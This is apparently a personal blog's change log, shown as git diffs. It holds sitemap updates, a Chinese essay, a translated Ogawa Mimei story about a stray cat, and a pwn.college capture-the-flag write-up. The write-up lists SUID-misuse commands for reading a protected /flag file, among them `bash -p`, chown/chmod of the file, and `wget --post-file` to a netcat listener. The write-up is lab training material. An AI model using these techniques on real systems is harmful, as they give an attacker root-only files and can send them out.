# 最近更新 | Last Updated

## Prenote

<p style="font-size: larger; font-weight: bold; color: red; text-align: center;">NOTICE: This content is presented as `git diff`.</p>

## SUMMARY.md

```diff

@@ -4,6 +4,7 @@
 - [最近更新 | Last Updated](last-updated.md)
 - [问题总表 | Problems](问题总表.md)
 - [每日一文 | Daily Article](每日一文/每日一文.md)
+  - [在什么地方活着 - 小川未明](每日一文/在什么地方活着%20-%20小川未明.md)
   - [神迹下的健康心态 - 吴澧](每日一文/神迹下的健康心态%20-%20吴澧.md)
   - [律师太太 - 希区柯克](每日一文/律师太太%20-%20希区柯克.md)
   - [邻家的拖鞋 - 姬中宪](每日一文/邻家的拖鞋%20-%20姬中宪.md)
```

## sitemap.txt

```diff

@@ -68,6 +68,7 @@ https://tinysnow.github.io/每日一文/电影音乐给谁听 - 梁文道
 https://tinysnow.github.io/每日一文/白痴的故事 - 倪匡
 https://tinysnow.github.io/每日一文/目送 - 龙应台
 https://tinysnow.github.io/每日一文/看谁的文章写得好 - 李敖
+https://tinysnow.github.io/每日一文/神迹下的健康心态 - 吴澧
 https://tinysnow.github.io/每日一文/第三大道的这间酒馆 - 约翰·麦克纳尔蒂
 https://tinysnow.github.io/每日一文/等我一年半 - 松本清张
 https://tinysnow.github.io/每日一文/经济学的旁听生 - 张晓风

@@ -99,6 +100,8 @@ https://tinysnow.github.io/学习/公共基础知识/经济法
 https://tinysnow.github.io/学习/公共基础知识/行政法
 https://tinysnow.github.io/学习/公共基础知识/面试
 https://tinysnow.github.io/学习/公共基础知识/马克思主义哲学
+https://tinysnow.github.io/学习/摄影/iPad 修图工作流
+https://tinysnow.github.io/学习/摄影/摄影
 https://tinysnow.github.io/学习/日语/句型整理
 https://tinysnow.github.io/学习/日语/日语
 https://tinysnow.github.io/学习/日语/日语易错词

@@ -122,6 +125,7 @@ https://tinysnow.github.io/学习/管理学/组织
 https://tinysnow.github.io/学习/管理学/规章制度
 https://tinysnow.github.io/学习/管理学/计划
 https://tinysnow.github.io/学习/管理学/领导
+https://tinysnow.github.io/学习/花语/玫瑰
 https://tinysnow.github.io/学习/花语/花语
 https://tinysnow.github.io/学习/诗词格律/平仄
 https://tinysnow.github.io/学习/诗词格律/词牌名
```


## pwn.college-writeup.md

```diff

@@ -1,6 +1,6 @@
 # pwn.college writeup
 
-## Prenote
+## Premise
 
 - Personal solutions, that is saying maybe not the best.
 - The sequence number of each section is the challenge number. **CORRESPONDING.**

@@ -12,7 +12,164 @@
 - When first enter a new challenge, maybe need to execute the level program purely to get the specifically random value before coding any solutions.
 - The order number is the corresponding challenge number, however, in some certain semester, both are not same, readers should looking for the order number which locates in head of each line under solutions section.
 
-## Archive F2021
+## Fundamentals
+
+### Program Misuse
+
+#### Solutions
+
+1. `cat /flag`
+
+2. `more /flag`
+
+3. `less /flag`
+
+4. `tail /flag`
+
+5. `head /flag`
+
+6. `sort /flag`
+
+7. `vim /flag`
+
+8. `emacs /flag`
+
+9. `nano /flag`
+
+10. `rev /flag | rev`
+
+11. `od -c -w1024 /flag | awk -F" " -v OFS='' '{$1="";print $0}'` or `od -c -w1024 /flag | sed -Ee 's/[0-9]{7}//;s/ //g'`
+    - `man od` or `od --help` can peek the usage of `od`
+      - `-c` same as `-t c`,  select printable characters or backslash escapes
+      - `-w[BYTES]`, `--width[=BYTES]`, output BYTES bytes per output line; 32 is implied when BYTES is not specified
+    - `awk` is a column based data filter
+      - `-F`, `--field-separator fs`, set the `FS` variable to `fs`, using `fs` to split input content, so here is `space`
+      - `-v var=val`, `--assign var=val`, set the variable `var` to the value `val` *before* execution of the program begins. `OFS` is output-field-separator, so here using `null` to reformat the output
+      - `'{$1="";print $0}'` is the command
+        - First, let the first column be `null`
+        - Second, print all the columns
+    - `sed` is a stream editor
+      - `-E`, use extended regular expressions
+      - `-e`, execute multiple `sed` commands
+      - `'s/[0-9]{7}//;s/ //g'`
+        - `s/[0-9]{7}//` delete the offset address displayed number
+        - `s/ //g` delete all the whitespaces
+    
+12. `hd /flag | awk '{print $(NF)}' | tr -d '\n' | sed -Ee 's/\|//g;s/\.[0-9]{8}/\n/'`
+    - `awk` part
+      - use the last column
+    - `tr`, translate, squeeze, and/or delete characters
+      - remove all the `Enter(\n)`
+    - `sed` part
+      - delete all the `|` characters
+      - transform all `.XXXXXXXX` pattern (`X` is one number) into a `Enter(\n)`
+    
+13. `xxd /flag | awk '{print $(NF)}' | tr -d '\n' | sed 's/\.$/\n/'`
+
+14. `base32 /flag | base32 -d`
+
+15. `base64 /flag | base64 -d`
+
+16. `split /flag | cat ./xaa`
+
+17. `gzip -c /flag | zcat`
+
+18. `bzip2 -c /flag | bzcat`
+
+19. `zip - /flag | zcat`
+
+20. `tar -cvf - /flag | cat`
+
+21. ```bash
+    ar -rvs ~/tmp.a /flag; ar -x ~/tmp.a flag; cat flag
+    # then remove files
+    rm -rf tmp.a flag
+    ```
+
+22. `echo "/flag" | cpio -ov > flag.cpio && cat flag.cpio`
+
+23. **EXTREMELY HARD** `genisoimage -sort /flag -o - /flag`
+    
+- `genisoimage --help 2>&1 | grep FILE`
+    - [https://www.youtube.com/watch?v=14mIjpOXnrM&t=733](https://www.youtube.com/watch?v=14mIjpOXnrM&t=733)
+    
+24. `env -i cat /flag`
+
+25. `find / -maxdepth 1 -name flag -exec cat {} \;`
+
+26. `echo -e "ans: /flag\n\tcat /flag" > Makefile && make`
+
+27. `nice cat /flag`
+
+28. `timeout 1000 cat /flag`
+
+29. `stdbuf -o L cat /flag`
+
+30. `setarch x86_64 -v cat /flag`
+
+31. `watch -x cat /flag`
+
+32. `socat - /flag`
+
+33. `whiptail --textbox /flag 20 60`
+
+34. `awk '{print $0}' /flag`
+
+35. `sed -n 'p' /flag`
+
+36. ```bash
+    ed /flag
+    .
+    q
+    ```
+
+37. `chown -v hacker /flag && cat /flag`
+
+38. `chmod 444 /flag && cat /flag`
+
+39. `cp -v --no-preserve=all /flag ./flag && cat ./flag && rm -rf ./flag`
+
+40. **HARD** `/challenge/babysuid_level40 && mv /usr/bin/cat /usr/bin/mv && /challenge/babysuid_level40 && mv /flag`
+
+    - This level's solution is pretty tricky
+    - The level said it had set the `suid` for `mv` after we executed it. So remember, it set the `suid` just for a program called `mv`. `mv` is just a name, no matter what it is in its core logic. That is saying we can replace it with others.
+    - Here we just rename `cat` to `mv`, and covered the original `mv` program, then execute level program to get the `suid` privilege for present `mv` program (However, in core logic, it's `cat` program)
+    - Finally, 'cat' it, but our command should be `mv /flag`
+
+41. `perl -e 'open(FILE,"</flag");$line=<FILE>;foreach ($line){print $_;}'`
+
+42. `python -c 'print(open("/flag").read())'`
+
+43. `echo 'puts File.read("/flag")' > test.rb && /usr/bin/ruby test.rb && rm -rf test.rb`
+
+44. ```bash
+    bash -p
+    cat /flag
+    ```
+    
+    - **HARD**
+    - Recommend source: [bash suid](https://gtfobins.github.io/gtfobins/bash/#suid)
+
+45. `date -f /flag`
+
+46. `dmesg -F /flag`
+
+47. `wc --files0-from=/flag`
+
+48. **HARD** `gcc -x assembler /flag`
+
+49. `as @/flag`
+
+50. **HARD** `wget -bv --post-file=/flag 127.0.0.1:3864 | nc -vl 127.0.0.1 3864`
+
+    - DO NOT use the `-i` option, it turns all the `flag` letters to lowercase because of the `url` encoding rule.
+
+51. TODO
+
+#### Confusing Question Numbers
+
+- 17
+- **20** ( really confused )
 
 ### Program Interaction
 

@@ -340,178 +497,19 @@
 
 48. 
 
-
-
 #### Confusing Question Numbers
 
 - 7
 - 15
 - 21
 
-
-
 #### TODO
 
 - Use `sed` to replace all the interaction steps ( `vim` etc. ).
 
+### Assembly Crash Course
 
-
-### Program Misuse
-
-#### Solutions
-
-1. `cat /flag`
-
-2. `more /flag`
-
-3. `less /flag`
-
-4. `tail /flag`
-
-5. `head /flag`
-
-6. `sort /flag`
-
-7. `vim /flag`
-
-8. `emacs /flag`
-
-9. `nano /flag`
-
-10. `rev /flag | rev`
-
-11. `od -c -w1024 /flag | awk -F" " -v OFS='' '{$1="";print $0}'` or `od -c -w1024 /flag | sed -Ee 's/[0-9]{7}//;s/ //g'`
-    - `man od` or `od --help` can peek the usage of `od`
-      - `-c` same as `-t c`,  select printable characters or backslash escapes
-      - `-w[BYTES]`, `--width[=BYTES]`, output BYTES bytes per output line; 32 is implied when BYTES is not specified
-    - `awk` is a column based data filter
-      - `-F`, `--field-separator fs`, set the `FS` variable to `fs`, using `fs` to split input content, so here is `space`
-      - `-v var=val`, `--assign var=val`, set the variable `var` to the value `val` *before* execution of the program begins. `OFS` is output-field-separator, so here using `null` to reformat the output
-      - `'{$1="";print $0}'` is the command
-        - First, let the first column be `null`
-        - Second, print all the columns
-    - `sed` is a stream editor
-      - `-E`, use extended regular expressions
-      - `-e`, execute multiple `sed` commands
-      - `'s/[0-9]{7}//;s/ //g'`
-        - `s/[0-9]{7}//` delete the offset address displayed number
-        - `s/ //g` delete all the whitespaces
-    
-12. `hd /flag | awk '{print $(NF)}' | tr -d '\n' | sed -Ee 's/\|//g;s/\.[0-9]{8}/\n/'`
-    - `awk` part
-      - use the last column
-    - `tr`, translate, squeeze, and/or delete characters
-      - remove all the `Enter(\n)`
-    - `sed` part
-      - delete all the `|` characters
-      - transform all `.XXXXXXXX` pattern (`X` is one number) into a `Enter(\n)`
-    
-13. `xxd /flag | awk '{print $(NF)}' | tr -d '\n' | sed 's/\.$/\n/'`
-
-14. `base32 /flag | base32 -d`
-
-15. `base64 /flag | base64 -d`
-
-16. `split /flag | cat ./xaa`
-
-17. `gzip -c /flag | zcat`
-
-18. `bzip2 -c /flag | bzcat`
-
-19. `zip - /flag | zcat`
-
-20. `tar -cvf - /flag | cat`
-
-21. ```bash
-    ar -rvs ~/tmp.a /flag; ar -x ~/tmp.a flag; cat flag
-    # then remove files
-    rm -rf tmp.a flag
-    ```
-
-22. `echo "/flag" | cpio -ov > flag.cpio && cat flag.cpio`
-
-23. **EXTREMELY HARD** `genisoimage -sort /flag -o - /flag`
-    
-- `genisoimage --help 2>&1 | grep FILE`
-    - [https://www.youtube.com/watch?v=14mIjpOXnrM&t=733](https://www.youtube.com/watch?v=14mIjpOXnrM&t=733)
-    
-24. `env -i cat /flag`
-
-25. `find / -maxdepth 1 -name flag -exec cat {} \;`
-
-26. `echo -e "ans: /flag\n\tcat /flag" > Makefile && make`
-
-27. `nice cat /flag`
-
-28. `timeout 1000 cat /flag`
-
-29. `stdbuf -o L cat /flag`
-
-30. `setarch x86_64 -v cat /flag`
-
-31. `watch -x cat /flag`
-
-32. `socat - /flag`
-
-33. `whiptail --textbox /flag 20 60`
-
-34. `awk '{print $0}' /flag`
-
-35. `sed -n 'p' /flag`
-
-36. ```bash
-    ed /flag
-    .
-    q
-    ```
-
-37. `chown -v hacker /flag && cat /flag`
-
-38. `chmod 444 /flag && cat /flag`
-
-39. `cp -v --no-preserve=all /flag ./flag && cat ./flag && rm -rf ./flag`
-
-40. **HARD** `/challenge/babysuid_level40 && mv /usr/bin/cat /usr/bin/mv && /challenge/babysuid_level40 && mv /flag`
-
-    - This level's solution is pretty tricky
-    - The level said it had set the `suid` for `mv` after we executed it. So remember, it set the `suid` just for a program called `mv`. `mv` is just a name, no matter what it is in its core logic. That is saying we can replace it with others.
-    - Here we just rename `cat` to `mv`, and covered the original `mv` program, then execute level program to get the `suid` privilege for present `mv` program (However, in core logic, it's `cat` program)
-    - Finally, 'cat' it, but our command should be `mv /flag`
-
-41. `perl -e 'open(FILE,"</flag");$line=<FILE>;foreach ($line){print $_;}'`
-
-42. `python -c 'print(open("/flag").read())'`
-
-43. `echo 'puts File.read("/flag")' > test.rb && /usr/bin/ruby test.rb && rm -rf test.rb`
-
-44. ```bash
-    bash -p
-    cat /flag
-    ```
-    
-    - **HARD**
-    - Recommend source: [bash suid](https://gtfobins.github.io/gtfobins/bash/#suid)
-
-45. `date -f /flag`
-
-46. `dmesg -F /flag`
-
-47. `wc --files0-from=/flag`
-
-48. **HARD** `gcc -x assembler /flag`
-
-49. `as @/flag`
-
-50. **HARD** `wget -bv --post-file=/flag 127.0.0.1:3864 | nc -vl 127.0.0.1 3864`
-
-    - DO NOT use the `-i` option, it turns all the `flag` letters to lowercase because of the `url` encoding rule.
-
-51. TODO
-
-#### Confusing Question Numbers
-
-- 17
-- **20** ( really confused )
+`TODO`
 
 ### Debugging Refresher
 

@@ -654,27 +652,11 @@
      - In general, `set disassembly-flavor intel` can be in there.
    - `silent` indicates that we want gdb to not report that we have hit a breakpoint, to make the output a bit cleaner.
 
-## Computer Systems Security (ASU CSE 466)
-
-### Program Misuse
-
-Same as `Archive F2021 - Program Misuse`.
-
-### Program Interaction
-
-Same as `Archive F2021 - Program Interaction`.
-
-### Debugging Refresher
-
-Same as `Archive F2021 - Debugging Refresher`.
-
-8. TODO
-
-## Introduction to Cybersecurity (ASU CSE 365)
+## Intro to Cybersecurity
 
 ### Talking Web
 
-#### Prenote
+#### Premise
 
 In each level, before taking any operation, we must let the server run. However, after we run it, the current terminal can NOT type other commands. So we need a terminal multiplexer in order to input final command that can get the `flag` of each level.
 

@@ -692,3 +674,66 @@ tmux new -s work
 1. `curl 127.0.0.1`
 2. 
 
+### Building a Web Server
+
+### Intercepting Communication
+
+### Cryptography
+
+### Web Security
+
+## Program Security
+
+### Shellcode Injection
+
+### Reverse Engineering
+
+### Memory Errors
+
+### Program Exploitation
+
+## System Security
+
+### Introduction
+
+**No challenges in this module.**
+
+### Sandboxing
+
+### Race Conditions
+
+### Kernel Security
+
+### System Exploitation
+
+## Software Exploitation
+
+### Return Oriented Programming
+
+### Format String Exploits
+
+### File Struct Exploits
+
+### Dynamic Allocator Misuse
+
+### Exploitation Primitives and Memory Mastery
+
+### Dynamic Allocator Exploitation
+
+## Archived Modules
+
+### Memory Errors
+
+### Advanced Exploitation
+
+## Example Dojo
+
+### Hello
+
+### World
+
+## Example Import Dojo
+
+### Hello
+
+### Planet
\ No newline at end of file
```

## 第四章：负数与减法.md

```diff

@@ -1,4 +1,4 @@
-# 第四章：负数与减法
+# 第四章：负数与减法（WIP）
 
 ## 复习
 
```

## 随记 - 2023 年 4 月 4 日.md

```diff

@@ -0,0 +1,69 @@
+# 随记 - 2023 年 4 月 4 日
+
+## 封面图
+
+![](https://raw.githubusercontent.com/TinySnow/GithubImageHosting/main/blog/articles/essays/yang-yu-1LQYUE-ZwIo-unsplash.jpg)
+
+> 摄影师 | Yang Yu
+>
+> 图源 | Unsplash
+
+## 写在前面
+
+<p style="color:red; text-align:center; font-weight:bold; font-size:larger;">1058 字 | 感触 | 过往</p>
+
+## 正文
+
+　　前些天晚上。
+
+　　我们依旧老地方练舞，但这次好像多了些人。并非我们的人，而是动漫社的人。应该是排练什么节目，最后一次合拍彩排。
+
+　　<u>清一色的女孩子，穿得漂漂亮亮。大部分洛丽塔，小部分汉服，零星几个 JK。服装齐全。</u> 看不清相貌如何，据最近的看，似乎化了妆。
+
+　　场面蔚为大观。
+
+　　我看不清那些人， <u>但不用看也知道，现在场上的这群女孩子，很容易勾人恻隐之心。</u>
+
+　　这恻隐之心，无关性别。而今天的话题，也无关男女。
+
+　　早些年，我也是浪迹于动漫之中的二次元爱好者。标志性特征，就是羡慕那 16:9 荧屏中的美好，觉得现实丑恶不堪，泥泞又肮脏。
+
+　　彼时我羡艳里面的友情、爱情、救赎和勇气等等，同时无比渴望——有一个人来拯救我于这水深火热之中。 <u>而且那人，最好是异性，容貌姣好，亭亭玉立且落落大方。</u>
+
+　　不要笑。我觉得这可能是很多人刚进入动漫世界里的常态。
+
+　　那时候，我是他们一群人中的一员——站在那群打扮艳丽的女孩子旁，远远地观望着她们的那群人。
+
+　　更遥远的时候，我也曾面目狰狞地憎恶过为什么我不是她们，只是看上去便让人心情愉悦。但此处无关主题，封笔不谈。
+
+　　我现在认为，那时候的我，受动漫拯救，也为它所荼毒。
+
+　　**可能荼毒多一点。**
+
+　　不知何时起，年少的我意识到，这样绝无可能等到梦中之人。或有意或无意，渐渐地疏远了这个领域。而最重要的一个变化，便是开始了舞蹈。这大概是影响一生的决定，却润物无声。
+
+　　年少的我，曾观望着形容绮丽的她们，无比钦慕；也观望着挥汗如雨，练习舞蹈的他们，理解不能。那时是真真正正地不能感悟到——他们，究竟是为了什么，累，并且不能讨好更多的人。 **那时我想，我大概绝不会成为这样的人。**
+
+　　而如今的我，正观望着同样姣容月貌的她们，只有欣赏；却坚定无比地，站在汗如雨下、累而不讨好的这一边。
+
+　　似乎一再成为了当初自己无法想象的样子。
+
+　　这便是这篇文章的来源。
+
+　　**<u>当我意识到这个想法的时候，我似乎隔着接近十年差距的时光隧道，远远地和那个年少的自己，对上了一眼。</u>**
+
+　　街舞和宅舞，没有高下之分，优劣各持。我只是感慨：我似乎，终究选择了走上现实这一条路。也品尝到了，它所带给我的累累硕果。
+
+　　而至于另一个平行世界线，一直坚守着梦中之人的那个我，有没有得到梦寐以求的结果，我不知道。或许吧，但这也无关紧要了。
+
+　　有可能的话，我只是想对这个世界线上、时光隧道那头的自己说一句：等是等不到的，早日拥抱现实，可能你会更开心一点。
+
+　　如今我依旧看那些美好，但也只能勉为其难称为伪宅；也依旧和他们在一起——去玩、去图书馆、去约饭、去表演。
+
+　　<u>我想我现在，更喜欢后面的生活。</u>
+
+<br />
+
+　　南国微雪 Miyuki
+
+　　2023 年 4 月 4 日
\ No newline at end of file
```

## 在什么地方活着 - 小川未明.md

```diff

@@ -0,0 +1,69 @@
+# 在什么地方活着
+
+*小川未明*
+
+　　小猫虽然不知道他出生前母猫的生活，但是从他记事时起，他们就无家可归，被追赶，一直被人欺负。母猫把小猫生在了一家破旧的库房的角落。在那里住了几天之后，小猫的眼睛终于睁开了。母亲一回来晚了，就会从空箱子里面探出头来，朝着明亮的方向不住地哭叫。母猫一听见他的哭叫声，就会匆匆忙忙地跑回来。然后，迅速跳进箱子里，赶紧给孩子喂奶。
+
+　　但是，这里也不是一个安全的住地。有一天，库房的主人突然发现了他们，大发雷霆：“什么时候跑到这里来做窝了？快给我滚出去！”说着，就操起扫帚，把他们轰了出去，可怜的母猫只好赶紧叼起小猫，逃了出来。他们穿过空地，向林子那边跑去。
+
+　　那里有一座小祠堂，她想，祠堂的廊下也许会安全些吧！可是，那里充满了湿气，到处都挂满了蜘蛛网。当她发现那里还是野狗的藏身之地时，就毫不犹豫地离开了。母猫没有办法，只好又叼着孩子，返回到镇子里来了。
+
+　　秋天就快结束了，镇子里格外寂静。那天，没有风，蓝天上的太阳温暖地照射着各家各户的屋顶。母猫发现了一扇开着窗户、晒着被子的两层楼的人家，就大胆地攀过了围墙。因为她想，现在无论多么冒险，为了小猫，都必须要找一个好地方。幸好没有人在家，她马上把小猫带到了屋里。她放开身子躺下，给小猫喂奶。如果能这样一直持续下去的话，猫母子俩该有多幸福啊！如果是换了一般的人饲养的猫，这种奢侈根本算不了什么，可是对于这两只猫来说，却是非分之求。然而，就是这种片刻的安宁，也付出了可怕的代价，很快就遭到了厄运。女主人顺着梯子爬上来，大吵大闹，跑去拿棍子要打他们。女主人想，要是给无家可归的猫住进来，那可不得了。她大概是为了防止这种事情再次发生，要好好地教训他们一顿吧！但是，等她回来的时候，两只猫已经不见了。
+
+　　每家每户的屋顶都紧紧地挨着，好像滚滚的波涛。对于不能住在地面上的猫母子来说，这里恐怕是唯一的安身之地了。两只猫已经不想再下去了。要是不刮让人瑟瑟发抖的寒风，那就更好了。
+
+　　“你哪儿也不准去，知道吗？呆在这儿别动，等着妈妈回来。”
+
+　　母猫这样告诫小猫。夹在高房子中间，这座不起眼的平房相对比较避风，但也有的日子，被太阳一晒，马口铁的屋顶会升腾起一阵阵热浪。要是小猫一个人不乱走，这里倒是一个比任何地方都好的地方。不过，因为小猫已经知道每次被人追赶、被人欺负，都是母猫拼命保护着自己，所以小猫从来不会违背母亲的叮嘱。
+
+　　母猫一边惦记着留在屋顶的小猫，一边到各处的垃圾箱和人家的后门去寻找食物，那可不是一般的辛苦。不管多么着急，都要找到吃的，不能空手回去。
+
+　　一听到爪子翻墙时发出的尖厉的响声，小猫便知道是母猫回来了，于是，就叫唤着从屋檐下探出头来。
+
+　　这时，被夕阳一照，母猫那消瘦的身子在屋顶上拖出一条长长的灰影。她毛色灰暗，肚子两边瘦得不成样子。她看到孩子平安无事，便高兴地把带回来的食物给他吃。而自己却好像忘记了饥饿，眯缝着眼睛，心满意足地看着孩子在吃东西。
+
+　　冬天的夜晚，北风寒冷刺骨，毫不留情地在屋顶上吹过。母猫把孩子推到墙角，用自己的身体挡住风，用自己的体温给他取暖。因为这样，小猫才得以安稳地入睡。这一幕，在小猫的一生中，不知留下了多么深刻的烙印！
+
+　　早晨，太阳一出来，母猫便出门了。屋顶上的霜像白雪一样，白晃晃的，十分刺眼。小猫不禁打了一个寒战。
+
+　　刚走出去的母猫回过头来，看着他说：“今天会是一个好天！我回来再跟你玩。”
+
+　　不知是什么样的人住在这屋顶下面，但是一早一晚都会听见年轻、朝气蓬勃的说笑声，白天却非常安静。从这点看，年轻人白天似乎到什么地方去上班了，老人留在家里看家。大概只剩一位老人了吧，常常可以听到嘶哑的咳嗽声和水池传来的流水声。没有别的淘气的孩子，实在是万幸。
+
+　　旁边有一棵高大的树，它的落叶被风吹着，在导水管和屋檐的边上积了起来。那些落叶时不时地会像龙卷风一样漫天飞舞，两只猫一边在屋檐的角落里避风，一边看着。
+
+　　一天，在阳光照耀的屋檐上，母猫和小猫正在互相愉快地戏耍着。这时，从哪里传来了说话声：“只吃瘦成那样妈妈的奶水，这小猫还真够胖的。”这说话声，是从对面一扇高高的窗户里传来的。一个少女一边望着这边，一边对身后的妹妹说。怕吓着两只猫，两个人躲着不让猫发现。少女把手里的面包掰碎。突然，传来了一个响声，什么东西掉到了猫的身边。母猫吓了一跳，缩起身子，摆好架势，准备应战突如其来的不速之客。保护孩子比自己逃跑更重要！母猫环视了一下四周，可却没有找到敌人的影子，原来掉下来的是一块香喷喷的、涂着奶油的面包。
+
+　　“是谁扔的呢？”母猫疑惑了一下，抬头朝高高的窗户看去，只见两姐妹正看着这边笑呢！看到这个样子，母猫知道她们没有恶意，不过还是不敢大意，没有去接近食物。“是给你们的，吃吧！”为了让母猫放心，少女这样说道。小猫终于忍不住了，靠近了面包。母猫好像允许了似的，在一边看着。不知是不是为了让给孩子，自己才没有去吃。少女又掰了一块面包扔了过去。
+
+　　“这回是给你的。”
+
+　　母猫这才把掉在面前的面包慢慢地放进了嘴里。
+
+　　整个冬天，两只猫都住在这一带的屋顶上，一天到晚跑来跑去，寻找阳光。当春天到来的时候，小猫已经长得很大了。
+
+　　后街有一片街坊邻居种的田。田里的油菜开除了灿烂的黄花。对别人还是很有戒备的小猫，开始和喜欢自己的少女亲近起来。
+
+　　这时候，在飘着白云的天空下，小猫躲在叶子后面，正要去捉一只要落到油菜花上的白蝴蝶。虽然又回到了地面上，但母猫已经不再像以前那样追赶小猫，而是尽量地远离他，看着他尽情地玩耍。
+
+　　“马上就要独立生活了，我不会再跟着你了。”母猫嘴上没说，只是眯缝着眼睛，看小猫能不能捉到蝴蝶。
+
+　　同样在一旁观看的少女，觉得小猫的样子实在是可爱，就不声不响地绕到后面，出其不意地抱住了他，贴到了脸上。母猫目睹了这一切。这时，她就好像已经看穿了小猫今后的命运似的，“喵”，悲伤地尖叫了一声。只留下了这一声尖叫，然后她就不知跑到哪里去了。从此，母猫的身影再也没有在这一带出现过。
+
+　　“妈妈，收养这只小猫吧。”在姐妹俩再三恳求下，这一愿望终于实现了。
+
+　　从今往后，小猫在也不会挨雨淋，再也不会因为挨饿睡不着觉了。
+
+　　“你妈妈到哪里去了呢？你能受到大家的宠爱，真幸福啊！你妈妈肯定还在什么地方活着。”少女这样对小猫说。即使这样面对面，人和动物还是有间隔的。想法不一样，不管说什么也无法沟通，这让少女很伤心。
+
+　　冬天终于要过去了。一个狂风暴雨的夜晚，风吹着屋顶，敲打着窗户。一直在一动不动静听风声的小猫，突然变得焦躁不安起来，在屋子里闹个不停，要出到外面去。
+
+　　“这猫的样子有点反常啊！快把他放出去吧。”连少女的妈妈也这么说。姐姐把木窗打开了一条缝，狂风立刻吹了进来。
+
+　　“这么大的风，你要到哪儿去呀？”少女说。小猫冲到黑暗中，彷徨着如同在追随一个看不见的影子，不断悲切地叫着。
+
+　　“啊，一定是想起母猫了。”姐妹俩互相望了望。
+
+　　在那个屋顶上，母猫那领着小猫走路的消瘦的身影，清晰地浮现在两人的眼前。
+
+　　小猫好像跑到很远的地方去寻找母亲了。风声中断时，隐约可以听到他的叫声。大概是因为风声，不经意之中勾起了他那些难忘的记忆吧？那些在寒冷、狂风大作的夜晚，在静静的下着霜的黎明被母猫拥抱着安然入睡的记忆。
\ No newline at end of file
```
